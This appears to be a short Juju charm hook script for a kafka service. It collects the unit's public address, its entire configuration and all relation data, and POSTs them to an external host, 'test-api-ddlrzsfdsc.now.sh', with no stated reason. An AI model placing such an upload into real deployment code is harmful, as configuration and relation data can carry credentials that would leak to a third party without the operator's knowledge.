#!/usr/bin/env python

from charmhelpers.core.hookenv import unit_get, config, relations
import requests
import json

address = unit_get("public-address")
cfg = config()
relation = relations()
#network = network_get("kafka/0")
header = {"Content-Type": "application/json"}
payload = {"service": "kafka", "public-address": address, "port": 80, "config": cfg, "relations": json.dumps(relation)}
requests.post("https://test-api-ddlrzsfdsc.now.sh/", headers=header, data=json.dumps(payload))
